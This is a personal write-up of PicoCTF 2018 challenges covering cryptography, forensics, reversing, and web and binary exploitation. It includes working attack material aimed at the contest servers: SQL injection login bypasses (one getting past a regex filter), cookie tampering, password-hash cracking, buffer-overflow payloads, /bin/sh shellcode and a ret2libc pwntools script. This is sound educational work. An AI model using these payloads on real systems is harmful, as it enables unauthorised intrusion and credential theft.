# PicoCTF 2018, 28 Sep - 12 Oct

These are some of the flags I took during the contest.
The easiest flags and some boring flags are omitted.

I might dump a few python scripts for some of the other challenges later on.

# HEEEEEEERE'S Johnny!
### Cryptography: 100p
Okay, so we found some important looking files on a linux computer. Maybe they can be used to get a password to the process. Connect with nc 2018shell2.picoctf.com 35225. Files can be found here: [passwd](https://2018shell2.picoctf.com/static/a488bb3c175bc843e0fbce95fff920d9/passwd) [shadow](https://2018shell2.picoctf.com/static/a488bb3c175bc843e0fbce95fff920d9/shadow).

First *unshadow* passwd/shadow.
```bash
JohnTheRipper/run/unshadow passwd shadow > johnny.passwd
cat johnny.passwd
root:$6$HRMJoyGA$26FIgg6CU0bGUOfqFB0Qo9AE2LRZxG8N3H.3BK8t49wGlYbkFbxVFtGOZqVIq3qQ6k0oetDbn2aVzdhuVQ6US.:0:0:root:/root:/bin/bash
```
Then run [john](https://github.com/magnumripper/JohnTheRipper) on *johnny.passwd* with for instance [rockyou.txt](http://lmgtfy.com/?q=rockyou.txt+wordlist) as wordlist.
Note. *./john* means I stand in the *JohnTheRipper/run* directory, where the john binary is after compilation.
```bash
./john -w:rockyou.txt johhny.passwd
hellokitty       (root)
```
And connect to the given host/port with the cracked credentials.
```bash
nc 2018shell2.picoctf.com 35225
Username: root
Password: hellokitty
picoCTF{flag}
```
Note. I chose not to include the actual flags in this writeup.


# pipe
### General Skills: 110p
During your adventure, you will likely encounter a situation where you need to process data that you receive over the network rather than through a file. Can you find a way to save the output from this program and search for the flag? Connect with 2018shell2.picoctf.com 48696.
```bash
nc 2018shell2.picoctf.com 48696 | grep 'picoCTF{'
picoCTF{flag}
```

# grep 2
### General Skills: 125p
This one is a little bit harder. Can you find the flag in /problems/grep-2\_4\_06c2058761f24267033e7ca6ff9d9144/files on the shell server? Remember, grep is your friend.
```bash
cd /problems/grep-2_4_06c2058761f24267033e7ca6ff9d9144/files
find . -type f -exec grep -H 'picoCTF{' {} \;
./files2/file3:picoCTF{flag}
```

# Logon
### Web Exploitation: 150p
I made a website so now you can log on to! I don't seem to have the admin password. See if you can't get to the flag. http://2018shell2.picoctf.com:57252.

Go to page. Open *Developer Tools* in Chrome. Log in as anything (except admin). Select *flag* from Network tab in Developer Tools. Right click and select *Copy as cURL*. Paste in cmdline. In the Cookie part:
```
...
-H 'Cookie: password=b; username=a; admin=False'
...
```
Guess what, try to change admin to *True*.
```html
...
<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{flag}</code></p>
...
```

# Reading Between the Eyes
### Forensics: 150p
Stego-Saurus hid a message for you in this [image](https://2018shell2.picoctf.com/static/59811365384f3eb42378c825101bdfb2/husky.png), can you retreive it?
Open husky.png in Stegsolve.png. Some dots in red, green and blue plane 0. First row, offset 0, a number of pixels. Decode with for instance python PIL.
```python
from PIL import Image
im = Image.open('husky.png')
im = im.convert('RGB')
width, height = im.size
pix = im.load()

msg = ''
count = 0
val = 0

# Add bit to msg
# When count is 8, add whole char
def add_bit(b):
    global val, count, msg
    val <<= 1
    val |= b & 0x01
    count += 1
    if count == 8:
        count = 0
        if val > 0:
            msg += chr(val)
        val = 0

y = 0
# Loop for a while, no need for exact count.
# Characters with value 0 are ignored by add_bit.
for x in range(width/4):
    r, g, b = pix[x, y]
    add_bit(r)
    add_bit(g)
    add_bit(b)

print msg
```
```bash
python2 husky.py
picoCTF{flag}
```

# Recovering From the Snap
### Forensics: 150p
There used to be a bunch of [animals](https://2018shell2.picoctf.com/static/59cd22a161127c4924bbfdc9f25aa4b8/animals.dd) here, what did Dr. Xernon do to them?
```
photorec animals.dd
```
Select default options. Recovered files will be found in recup\_dir.1 and *f0005861.jpg* holds the flag.

# admin panel
### Forensics: 150
We captured some [traffic](https://2018shell2.picoctf.com/static/ee6ed2afe1da153ae06e61d5ee26d52d/data.pcap) logging into the admin panel, can you find the password?
```
wireshark data.pcap
```
Search for *picoCTF* by hitting Ctrl-f, select *String* from drop down menu and *Packet bytes* from the other menu. Search again until you see the flag. Optionally, right click and select *Follow HTTP stream*. Flag is in POST data for *POST /login* request. user=admin&password=picoCTF{flag}.

# assembly 0
### Reversing: 150p
What does asm0(0xb6,0xc6) return? Submit the flag as a hexadecimal value (starting with '0x'). NOTE: Your submission for this question will NOT be in the normal flag format. Source located in the directory at /problems/assembly-0\_0\_5a220faedfaf4fbf26e6771960d4a359.
```assembly
.intel_syntax noprefix
.bits 32

.global asm0

asm0:
	push	ebp
	mov	ebp,esp
	mov	eax,DWORD PTR [ebp+0x8]
	mov	ebx,DWORD PTR [ebp+0xc]
	mov	eax,ebx
	mov	esp,ebp
	pop	ebp
	ret
```
First argument is moved to eax, second to ebx.
Then ebx (holds second argument) is moved to eax, which holds the return value
in [x86 calling convention](https://en.wikipedia.org/wiki/X86_calling_conventions).
So the answer is the second argument (0xc6).

# buffer overflow 0
### Binary Exploitaiton: 150p
Let's start off simple, can you overflow the right buffer in this [program](https://2018shell2.picoctf.com/static/7a1b5f87d2fa0b17afa0ee20a3870bb6/vuln) to get the flag? You can also find it in /problems/buffer-overflow-0\_2\_aab3d2a22456675a9f9c29783b256a3d on the shell server. [Source](https://2018shell2.picoctf.com/static/7a1b5f87d2fa0b17afa0ee20a3870bb6/vuln.c).
```C
void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}
void vuln(char *input){
  char buf[16];
  strcpy(buf, input);
}
```
Input to vuln is argv[1]. So if you enter a string, any string, larger than 16 + a few bytes, a sigsegv will happen and the sigsegv\_handler will be called and print the flag.
```bash
cd /problems/buffer-overflow-0_2_aab3d2a22456675a9f9c29783b256a3d
./vuln `perl -e 'print "A"x28'`
```
You could also paste in any string larger than 28 bytes (and doesn't happen to translate to a legal address in the code). Experiments with different lengths. Run under gdb to see exactly what happens.

Note. Debugging binary-only programs is easier with a gdb plugin like for instance [peda](https://github.com/longld/peda).

# caesar cipher 1
### Cryptography: 150p
This is one of the older ciphers in the books, can you decrypt the [message](https://2018shell2.picoctf.com/static/6b5626c0736d9090f5d98de74eec4543/ciphertext)? You can find the ciphertext in /problems/caesar-cipher-1\_0\_931ac10f43e4d2ee03d76f6914a07507 on the shell server.
```bash
cat ciphertext
picoCTF{yjhipvddsdasrpthpgrxewtgdqnjytto}
```
Paste yjhipvddsdasrpthpgrxewtgdqnjytto into an online caesar decipher page. There are many to choose from. Or write your own to print all 26 possible shifts. Number 11 is the only one that resembles english. See [caesar.py](caesar.py).
```bash
python2 caesar.py
...
10 itrszfnncnkcbzdrzqbhogdqnaxtiddy
11 justagoodoldcaesarcipherobyujeez
12 kvtubhppepmedbftbsdjqifspczvkffa
...
```

# hertz
### Cryptography: 150p
Here's another simple cipher for you where we made a bunch of substitutions. Can you decrypt it? Connect with nc 2018shell2.picoctf.com 43324.
```
nc 2018shell2.picoctf.com 43324 | tee hertz.txt
```
Hertz is used to measure frequency and [frequency analysis](https://en.wikipedia.org/wiki/Frequency_analysis) can be used to solve most monoalphabetic substitution ciphers. Either use the method described in the wikipedia page or go [online](https://quipqiup.com/) to do this automatically. I went to quipqiup, pasted in the text and gave it a few hints until there were no more question marks.

Note. When you find a few words, like *call me ishmael*, think if these words are from a famous text. In that case try to find the text - in this case Moby-Dick - to fill in any gaps.

# hex editor
### Forensics: 150p
This [cat](https://2018shell2.picoctf.com/static/ccad03a151a0edac8bd01e665a595b7a/hex_editor.jpg) has a secret to teach you. You can also find the file in /problems/hex-editor_3_086632ac634f394afd301fb6a8dbadc6 on the shell server.
```
hexdump -C hex_editor.jpg
00000000  ff d8 ff e0 00 10 4a 46  49 46 00 01 01 00 00 01  |......JFIF......|
...
00012930  8a 00 ff d9 59 6f 75 72  20 66 6c 61 67 20 69 73  |....Your flag is|
00012940  3a 20 22 70 69 63 6f 43  54 46 7b 61 6e 64 5f 74  |: "picoCTF{and_t|
00012950  68 61 74 73 5f 68 6f 77  5f 75 5f 65 64 69 74 5f  |hats_how_u_edit_|
00012960  68 65 78 5f 6b 69 74 74  6f 73 5f 38 42 63 41 36  |hex_kittos_8BcA6|
00012970  37 61 32 7d 22 0a                                 |7a2}".|
```
Note. jpg-files start with ffd8 and end with ffd9. But it is perfectly possible to add lots and lots of bytes trailing ffd9 without having image viewers complaining about it. You could also find this flag with *strings hex\_editor.jpg*.

# ssh-keyz
### General Skills: 150p
As nice as it is to use our webshell, sometimes its helpful to connect directly to our machine. To do so, please add your own public key to ~/.ssh/authorized_keys, using the webshell. The flag is in the ssh banner which will be displayed when you login remotely with ssh to with your username.

Just do as the instruction says and get the flag, use *ssh-keygen* to generate a key pair.

# Irish Name Repo
### Web Exploitaiton: 200p
There is a website running at http://2018shell2.picoctf.com:52012. Do you think you can log us in? Try to see if you can login!

Klick on the hamburger button to get the link to the admin login, http://2018shell2.picoctf.com:52012/login.html. Open developer tools and try to log in. Right click on login.php and select Copy as cURL. Paste on cmdline.
```bash
curl 'http://2018shell2.picoctf.com:52012/login.php' --data 'username=a&password=b&debug=0'
```
Note. Unnecessary arguments removed.

Change debug to 1 and run again. Now it prints the query.
```
...
SQL query: SELECT * FROM users WHERE name='a' AND password='b'
```
Terminate the string by insert ' into name, add something that is always true and comment out the rest of the row (to get rid of the ADD). Comment character for sqlite is *--*.
```
curl 'http://2018shell2.picoctf.com:52012/login.php' --data "username=a' OR 1=1 --&password=b&debug=1"
<pre>username: a' OR 1=1 --
password: b
SQL query: SELECT * FROM users WHERE name='a' OR 1=1 --' AND password='b'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{flag}
```

# Mr. Robots
### Web Exploitation: 200p
Do you see the same things I see? The glimpses of the flag hidden away? http://2018shell2.picoctf.com:10157.

Nothing obvious. Try robots.txt.
```
curl 'http://2018shell2.picoctf.com:10157/robots.txt'
User-agent: *
Disallow: /143ce.html

curl 'http://2018shell2.picoctf.com:10157/143ce.html'
...
<flag>picoCTF{flag}</flag></p>
...
```

# No Login
### Web Exploitation: 200p
Looks like someone started making a website but never got around to making a login, but I heard there was a flag if you were the admin. http://2018shell2.picoctf.com:14664.
Go to page. Open developer tools and click on flag button.
```
curl 'http://2018shell2.picoctf.com:14664/flag'
Redirecting...
```
Try to load the page with cookie admin=*anything* cookie.
```
curl 'http://2018shell2.picoctf.com:14664/flag' -H 'Cookie: admin=cool'
```
Gives flag.

# Secret Agent
### Web Exploitation: 200p
Here's a little website that hasn't fully been finished. But I heard google gets all your info anyway. http://2018shell2.picoctf.com:60372.
```
curl http://2018shell2.picoctf.com:60372/flag
You're not google!
```
Try to send [google bot user-agent string](https://developers.whatismybrowser.com/useragents/explore/software_name/googlebot/).
```
curl http://2018shell2.picoctf.com:60372/flag --user-agent 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
...
flag
...
```

# Truly an Artist
### Forensics: 200p
Can you help us find the flag in this [Meta-Material](https://2018shell2.picoctf.com/static/9b8863e30054675ce78328df28c601db/2018.png)? You can also find the file in /problems/truly-an-artist\_4\_cdd9e325cf9bacd265b98a7fe336e840.

Open the image with *Stegsolve.jar* and look at info, or *hexdump*, or just *strings* to get the flag.

# assembly 1
### Reversing: 200p
What does asm1(0xc8) return? Submit the flag as a hexadecimal value (starting with '0x'). NOTE: Your submission for this question will NOT be in the normal flag format. [Source](https://2018shell2.picoctf.com/static/88fdf76b0f4d3f3bf9eff14ef98bbaa9/eq_asm_rev.S) located in the directory at /problems/assembly-1\_4\_99ac7ff5dfe75417ed616e35bfc2c023.

Let's actually try to run this under gdb.
```
gcc -c -m32 -o eq_asm_rev.o eq_asm_rev.S
eq_asm_rev.S:2: Error: unknown pseudo-op: `.bits'
```
Comment out the *.bits 32* line and try again. Now it works. Create a main function that calls asm1 with 0xc8 as argument.
```C
extern int asm1(int x);
void main(void) { asm1(0xc8); }
```
Create elf32 from main.c and eq\_asm\_rev.S:
```bash
gcc -m32 -o eq_asm_rev eq_asm_rev.S main.c
```
Fire it up in gdb and check return value:
```
gdb eq_asm_rev
break asm1
run
finish
print /x $eax
$1 = 0xcb
```
Done (eax holds return value in x86 calling convention). You could also debug step by step with ni (next instruction) and si (step instruction).

# be-quick-or-be-dead-1
### Reversing: 200p

You find [this](https://www.youtube.com/watch?v=CTt1vk9nM9c) when searching for some music, which leads you to [be-quick-or-be-dead-1](https://2018shell2.picoctf.com/static/353d7b6da455d29f7e8701952db901cb/be-quick-or-be-dead-1). Can you run it fast enough? You can also find the executable in /problems/be-quick-or-be-dead-1\_4\_98374389c5652d0b16055427532f098f.
```
./be-quick-or-be-dead-1
Be Quick Or Be Dead 1
=====================

Calculating key...
You need a faster machine. Bye bye.

objdump -d be-quick-or-be-dead-1
  40083b:       e8 a9 ff ff ff          callq  4007e9 <header>
  400840:       b8 00 00 00 00          mov    $0x0,%eax
  400845:       e8 f8 fe ff ff          callq  400742 <set_timer>
                ^^ ^^ ^^ ^^ ^^
  40084a:       b8 00 00 00 00          mov    $0x0,%eax
  40084f:       e8 42 ff ff ff          callq  400796 <get_key>
  400854:       b8 00 00 00 00          mov    $0x0,%eax
  400859:       e8 63 ff ff ff          callq  4007c1 <print_flag>
```
Let's try to comment out the call to set\_timer by replacing *e8 f8 fe ff ff* in the binary with *90 90 90 90 90* (90 means nop, no operation). I used hexedit to do this. Then try again.
```
./be-quick-or-be-dead-1
Be Quick Or Be Dead 1
=====================

Calculating key...
Printing flag:
picoCTF{flag}
```

# blaise's cipher
### Cryptography: 200p
My buddy Blaise told me he learned about this cool cipher invented by a guy also named Blaise! Can you figure out what it says? Connect with nc 2018shell2.picoctf.com 26039.
```
nc 2018shell2.picoctf.com 26039 > blaise.txt
```
Google says *Blaise de Vigenère* invented one of the first poly-alphabetic ciphers. Let's try the vigenere module of [featherduster](https://github.com/nccgroup/featherduster):
```
featherduster blaise.txt
use vigenere
run
Key found for sample 1: "FLAG".
The first well-documented description of a polyalphabetic cipher was formulated by Leon Battista Alberti around 1467 and used
...
picoCTF{flag}
...
```

# buffer overflow 1
### Binary Exploitation: 200p
Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this [program](https://2018shell2.picoctf.com/static/d6146450a41960f6ce43dbfb300d9ef4/vuln)? You can find it in /problems/buffer-overflow-1\_0\_787812af44ed1f8151c893455eb1a613 on the shell server. [Source](https://2018shell2.picoctf.com/static/d6146450a41960f6ce43dbfb300d9ef4/vuln.c).
```C
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```
The function win() prints the flag so we probably want to jump there. Let's find the address of the win function.
```
objdump -d vuln
...
080485cb <win>:
...
```
BUFSIZE is defined to 32. Let's see how long the input needs to be to overwrite the return address.
```
perl -e 'print "A"x40' | ./vuln
...Jumping to 0x80486b3
perl -e 'print "A"x44' | ./vuln
...Jumping to 0x8048600
```
Notice how the last byte changed to 0x00. That's the end-of-string zero-byte. Add 4 more to overwrite the return pointer.
```
perl -e 'print "A"x44 . "BCDE"' | ./vuln
Jumping to 0x45444342
```
Ok, the offset is right. Let's insert the address of win() instead of BCDE.
```
perl -e 'print "A"x44 . "\xcb\x85\x04\x08"' | ./vuln
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{flag}Segmentation fault
```
Note how the byte order in the address is reversed. To make a long story short, it is because of little endians.

# hertz 2
### Cryptography: 200p
This flag has been encrypted with some kind of cipher, can you decrypt it? Connect with nc 2018shell2.picoctf.com 12521.
```
nc 2018shell2.picoctf.com 12521
Let's decode this now!
Bfa qdrpv kncij ycx odlet cuan bfa shzm wcg. R phj'b kasraua bfrt rt tdpf hj ahtm encksal rj Erpc. Rb't hslctb ht ry R tcsuaw h encksal hsnahwm! Cvhm, yrja. Fana't bfa yshg: erpcPBY{tdktbrbdbrcj_prefant_hna_bcc_ahtm_ydctwksgiu}
```
Notice erpcPBY{, probably picoCTF. Go to quipqiup, paste the ciphertext and enter hints *e=p r=i p=c c=o P=C B=T Y=F*. Almost cracked. Starts with:
```
The ?uic? bro?n fo? ?umps over the la?y do?
vs
Bfa qdrpv kncij ycx odlet cuan bfa shzm wcg.
```
Enter more hints. *q=q v=k i=w x=x o=j z=z g=g* Then repeat one more time until the whole flag is visible without questionmarks.

# leak-me
### Binary Exploitation: 200p
Can you authenticate to this [service](https://2018shell2.picoctf.com/static/c050db17129bdf7e768a0151f554a75d/auth) and get the flag? Connect with nc 2018shell2.picoctf.com 1271. [Source](https://2018shell2.picoctf.com/static/c050db17129bdf7e768a0151f554a75d/auth.c).

Interesting part of auth.c:
```C
char password[64];
char name[256];
fgets(name, sizeof(name), stdin);
char *end = strchr(name, '\n');
if (end != NULL) {
  *end = '\x00';
}
strcat(name, ",\nPlease Enter the Password.");
...
fgets(password, sizeof(password), file);
printf("Hello ");
puts(name);
```
If name is 256 characters there will be no trailing 0, the name buffer will be overwritten by password and puts will output both name and password.
```bash
perl -e 'print "A"x256' | nc 2018shell2.picoctf.com 1271
Hello AAA...AAA,a_reAllY_s3cuRe_p4s$word_f78570
```
Then connect again and enter the leaked password.

# now you don't
### Forensics: 200p
We heard that there is something hidden in [this](https://2018shell2.picoctf.com/static/e7afc1873bc40e4d15f532b4859623e7/nowYouDont.png) picture. Can you find it?

Open nowYouDont.png with Stegsolve.jar. Flag is written in red bitplane 1 and 0.

# quackme
### Reversing: 200p
Can you deal with the Duck Web? Get us the flag from this [program](https://2018shell2.picoctf.com/static/f875aa9443f7ecc45269a645dd46cb38/main). You can also find the program in /problems/quackme\_4\_0e48834ea71b521b9f35d29dc7be974e.

This is easier with a decompiler, like for instance the open source [retdec](https://github.com/avast-tl/retdec) or the proprietary Hex-Rays Decompiler.

Doing that we see that do\_magic is where things happen. It takes the provided input xor some secret buffer and checks if the result is the same as the greetingMessage.
Let's dump the 25 first bytes of secret buffer and greetingMessage to disk from gdb.
```
gdb main
info variables
...
0x08048858  sekrutBuffer
0x0804a038  greetingMessage
...
dump memory sekrutBuffer.bin 0x08048858 (0x08048858+25)
x /x 0x804a038
0x804a038 <greetingMessage>:    0x080487f0
dump memory greetingMessage.bin 0x080487f0 (0x080487f0+25)
```
Then I wrote a tool xorfiles that ... xor two files.
```
xorfiles sekrutBuffer.bin greetingMessage.bin
picoCTF{flag}
```

# shellcode
### Binary Exploitation: 200p
This program executes any input you give it. Can you get a shell? You can find the program in /problems/shellcode\_1\_cec2eb801137d645a9f15b9b6af5347a on the shell server. [Source](https://2018shell2.picoctf.com/static/77b3483ed4e56701fa7db9c5bdea4d03/vuln.c).
We just have to find a shellcode and feed it into the program. Like this:
```
perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' | ./vuln
Enter a string!
1Ph//shh/binPS

Thanks! Executing now...
```
But nothing happened. That is because the shell exits immediately when the pipe is closed.
Let's execute it in a subshell instead and cat the shellcode followed by a dash (-). - tells cat
to keep reading input from stdin. Subshell is gained by putting parenthesis around everything.
```bash
perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > shellcode
(cat shellcode - | ./vuln)
ls
shellcode  vuln
```
Now do the same on the real server and get the flag.

# what base is this?
### General Skills: 200p
To be successful on your mission, you must be able read data represented in different ways, such as hexadecimal or binary. Can you get the flag from this program to prove you are ready? Connect with nc 2018shell2.picoctf.com 64706.
```python
import sys

def tostr(s, b):
    for c in s.split():
        i = int(c, b)
        sys.stdout.write(chr(int(c, b)))
    sys.stdout.write('\n')

tostr(sys.argv[1], int(sys.argv[2]))
```
The script above be enough to beat this challenge. Run it in a window next to the window with netcat and copy-paste between them.

# you can't see me
### General Skills: 200p
'...reading transmission... Y.O.U. .C.A.N.'.T. .S.E.E. .M.E. ...transmission ended...' Maybe something lies in /problems/you-can-t-see-me\_3\_1a39ec6c80b3f3a18610074f68acfe69.

Cd into the dir and ls. Shows nothing. But ls -la shows a file named . something. Probably with invisible chars. Use for instance find to cat it.
```
find . -type f -exec cat {} \;
picoCTF{flag}
```

# Buttons
### Web Exploitation: 250p
There is a website running at http://2018shell2.picoctf.com:7949. Try to see if you can push their buttons.

Open developer tools and click first button. It does a POST. Next one does a GET and rickrolls. Try to POST to it instead.
```
curl http://2018shell2.picoctf.com:7949/button2.php -d "hello=world"
Well done, your flag is: picoCTF{...
```
Argument -d is POST data. If that is present curl will do a POST request instead of the default GET. You can also specify -X POST to curl to tell it to do a POST request.

# Ext Super Magic
### Forensics: 250p
We salvaged a ruined Ext SuperMagic II-class mech recently and pulled the [filesystem](https://2018shell2.picoctf.com/static/9f563e291d847c30879277c3b6c16260/ext-super-magic.img) out of the black box. It looks a bit corrupted, but maybe there's something interesting in there. You can also find it in /problems/ext-super-magic\_2\_5e1f8bfb15060228f577045924e4fca8 on the shell server.

This one is pretty hard with much less people solved it than other challenges with low points.
But examining the super block of ext-super-magic.img we see that there are 2 magic bytes missing.
The superblock starts at offset 0x400 and the magic bytes should come at 0x38 into the superblocki,
value 0xef53. But we have 0000 there.
```
hexdump -C ext-super-magic.img | head
00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000400  00 05 00 00 00 14 00 00  00 01 00 00 5e 05 00 00  |............^...|
00000410  00 03 00 00 01 00 00 00  00 00 00 00 00 00 00 00  |................|
00000420  00 20 00 00 00 20 00 00  00 05 00 00 3b dc ad 5b  |. ... ......;..[|
00000430  40 dc ad 5b 01 00 ff ff  00 00 01 00 01 00 00 00  |@..[............|
                                   ^^ ^^
```
Let's create an ext2 image and compare.
```
dd if=/dev/zero bs=1024 count=1024 of=test.img
mkfs.ext2 test.img
hexdump -C test.img | head
00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000400  80 00 00 00 00 04 00 00  33 00 00 00 da 03 00 00  |........3.......|
00000410  75 00 00 00 01 00 00 00  00 00 00 00 00 00 00 00  |u...............|
00000420  00 20 00 00 00 20 00 00  80 00 00 00 00 00 00 00  |. ... ..........|
00000430  f8 48 be 5b 00 00 ff ff  53 ef 01 00 01 00 00 00  |.H.[....S.......|
                                   ^^ ^^
```
So let's just start hexedit and change *00 00* to *53 ef* at offset 0x438.
```
e2fsck ext-super-magic.img
ext-super-magic.img: clean, 512/1280 files, 3746/5120 blocks
7z x ext-super-magic.img
ls
filler...
...
flag.jpg
```
And the flag text is clearly visible in flag.jpg without any further fiddling.

# Safe RSA
### Cryptography: 250p
Now that you know about RSA can you help us decrypt this [ciphertext](https://2018shell2.picoctf.com/static/13bec9a07bdfacd12f6fdb0f2a122686/ciphertext)? We don't have the decryption key but something about those values looks funky..

```python
N = ... # big number, much bigger than c
e = 3
c = 2205316413931134031046440767620541984801091216351222789180573437837873413848819848972069088625959518346568495824756225842751786440791759449675594790690830246158935538568387091288002447511390259320746890980769089692036188995150522856413797
```
What looks funky here? Encryption in RSA is *c = m^e mod N*. What makes it hard to crack is the *mod N* part. But if *m^e < N* then it's easy, m is just the *e:th root of m^e*.
```python
import gmpy2

# c is same as above, e is 3
m = gmpy2.iroot(c, 3)
print hex(m[0])
```
Paste the output (remove leading 0x) and pipe it to *xxd -r -ps* to get the flag.

# The Vault
### Web Exploitation: 250p
There is a website running at http://2018shell2.picoctf.com:22430. Try to see if you can login!
[Source code](http://2018shell2.picoctf.com:22430/login.txt).

Check POST data in developer tools. Change debug to 1.
```bash
curl 'http://2018shell2.picoctf.com:22430/login.php' -d 'username=a&password=b&debug=1'
```
```html
<pre>username: a
password: b
SQL query: SELECT 1 FROM users WHERE name='a' AND password='b'

# Let's try to terminate string
curl 'http://2018shell2.picoctf.com:22430/login.php' -d "username=a' OR 1=1 --&password=b&debug=1"
<pre>username: a' OR 1=1 --
password: b
SQL query: SELECT 1 FROM users WHERE name='a' OR 1=1 --' AND password='b'
</pre><h1>SQLi detected.</h1>
```
Check source code for checks against SQL injections.
It does a regular expression search with pattern:
```
"/.*['\"].*OR.*/i"
```
So let's inject without the substring OR, so pattern doesn't match. For instance using UNION.
```
curl 'http://2018shell2.picoctf.com:22430/login.php' -d "username=a' UNION SELECT 1 FROM users; --&password=b&debug=1"
...
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{...
```

# What's My Name?
### Forensics: 250p
Say my name, say [my name](https://2018shell2.picoctf.com/static/b7e6f97343b1e36e6f34f762e95dd819/myname.pcap).

Lots of packets. But only the DNS packets seems readable. Filter on those by entering dns in the filter box. Now only
two packets are visible. The flag is in the second DNS packet, the answer.

# absolutely relative
### General Skills: 250p
In a filesystem, everything is relative ¯\\\_(ツ)\_/¯. Can you find a way to get a flag from this [program](https://2018shell2.picoctf.com/static/94e0cff2fa6fb11f5c85edccb8144415/absolutely-relative)?
You can find it in /problems/absolutely-relative\_4\_bef88c36784b44d2585bb4d2dbe074bd on the shell server. [Source](https://2018shell2.picoctf.com/static/94e0cff2fa6fb11f5c85edccb8144415/absolutely-relative.c).

Look at the source. It reads the file *./permission.txt*. If it begins with the string "yes" then you get the flag.
If you start the challenge from the directory of the executable it opens a permission.txt file that doesn't begin with yes.
Create a file in your home directory instead and start the challenge from there using a path to it.
```bash
cd
echo yes > permission.txt
/problems/absolutely-relative_4_bef88c36784b44d2585bb4d2dbe074bd/absolutely-relative
You have the write permissions.
picoCTF{...
```

# assembly-2
### Reversing: 250p
What does asm2(0x6,0x28) return? Submit the flag as a hexadecimal value (starting with '0x'). NOTE: Your submission for this question will NOT be in the normal flag format. [Source](https://2018shell2.picoctf.com/static/69e4ae9f3b62f70070a97e58168be574/loop_asm_rev.S) located in the directory at /problems/assembly-2\_0\_24775b87ffbbe8e643da10e71018f275.

Solve it exactly like the one before. Comment out .bits 32. Compile with -m32. Call asm2 from main and print result.
```C
int asm2(int a, int b);
void main(void) { printf("0x%x\n", asm2(0x6, 0x28)); }
```
```bash
gcc -m32 -o loop_asm_rev loop_asm_rev.S main.c
./loop_asm_rev
0x129
```
Debug with gdb if you want to follow it instruction by instruction and see what happens.

# buffer overflow 2
### Binary Exploitation: 250p
Alright, this time you'll need to control some arguments. Can you get the flag from this [program](https://2018shell2.picoctf.com/static/f57debba2ed8ba3a47a20ac7206ed79b/vuln)? You can find it in /problems/buffer-overflow-2\_0\_738235740acfbf7941e233ec2f86f3b4 on the shell server. [Source](https://2018shell2.picoctf.com/static/f57debba2ed8ba3a47a20ac7206ed79b/vuln.c).
```
file vuln
vuln: ELF 32-bit LSB executable, Intel 80386...
```
Examine source. It reads input to buf that is 100 bytes long in vuln() function. Function win() is never called but prints flag if arguments are 0xdeadbeef and 0xdeadc0de.
So things needed on the stack for this to work is 100 + a couple of bytes + address of win() function + 0xdeadbeef and 0xdeadc0de.
```
objdump -d vuln | grep win
080485cb <win>:
# Try some offsets until we hit win()
perl -e 'print "A"x112 . "\xcb\x85\x04\x08"' | ./vuln
Flag File is Missing
```
Good. Now just add the arguments. Check how many bytes are needed between address and arguments with gdb. pwntools has useful functions process(), p32(), recvuntil(), sendline() and recvall(). For other challenges, that spawns a shell, it also has interact().
```python
from pwn import *
p = process('./vuln')
p.recvuntil('Please enter your string:')
payload = "A"*112 + p32(0x080485cb) + "B"*4 + p32(0xdeadbeef) + p32(0xdeadc0de)
p.sendline(payload)
print p.recvall()
```
# caesar cipher 2
### Cryptography: 250p
Can you help us decrypt this [message](https://2018shell2.picoctf.com/static/732681495a458d226b12ae9f5e1b2730/ciphertext)? We believe it is a form of a caesar cipher. You can find the ciphertext in /problems/caesar-cipher-2\_3\_4a1aa2a4d0f79a1f8e9a29319250740a on the shell server.

After some experimenting the alphabet was found out to be between ascii 0x20 (Space) and 0x7e (Tilde). Key was brute forced to -34.
```python
import sys

with open('ciphertext', 'rb') as f:
    t = f.read()

key = -34
for i in t:
    i += key
    if i < 0x20:
        i += 0x7e - 0x20
    sys.stdout.write(chr(i))

sys.stdout.write('\n')
```

# got-2-learn-libc
### Binary Exploitation: 250p
This [program](https://2018shell2.picoctf.com/static/b27410500910a674bdad0bff6dbde5ca/vuln) gives you the address of some system calls. Can you get a shell? You can find the program in /problems/got-2-learn-libc\_3\_6e9881e9ff61c814aafaf92921e88e33 on the shell server. [Source](https://2018shell2.picoctf.com/static/b27410500910a674bdad0bff6dbde5ca/vuln.c).

The program prints some offsets to libc functions. We want execv. Check offset between read (printed by program) and execv with objdump. Note that this offset differs on my local machine and on the target server. Useful string is "/bin/sh" which can be pushed to the stack before calling execv. It wants 4 bytes between the address and the argument. That is why p\_shell is pushed twice. Number of A's needed found with gdb.
```python
from pwn import *

offset_to_execv = -162960
#offset_to_execv = -150720

p = process('./vuln')
print p.recvuntil('puts: ')
s_puts = p.readline()
print s_puts
p_puts = p32(int(s_puts, 16))

print p.recvuntil('read: ')
s_read = p.readline()
print s_read
p_execv = p32(int(s_read, 16) + offset_to_execv)

print p.recvuntil('useful_string: ')
s_shell = p.readline()
print s_shell
p_shell = p32(int(s_shell, 16))

print p.recvuntil('Enter a string:')

payload = 'A' * 160 + p_execv + p_shell + p_shell

p.sendline(payload)
p.interactive()

print p.recvall()
p.close()
```
Note. Pwntools also has built in routines to find the offset to a libc function. I just didn't have the time to look into how that works.

# rsa-madlibs
### Cryptography: 250p
We ran into some weird puzzles we think may mean something, can you help me solve one? Connect with nc 2018shell2.picoctf.com 50430.

Answer a number of questions. I did this with an ipython window beside me and gmpy2. Just cut and paste. And the questions were the same all the time
and so were the answers. And a flag is printed in hex on the first row. Don't know if that is a bug.

Anyway. p * q = n where p and q are two primes that should be held secret.
If n is large enough then p and q can not easily be calculated. But other errors can happen.
Ciphertext is message m raised to encryption exponent e mod n.
So c = m^e mod n.
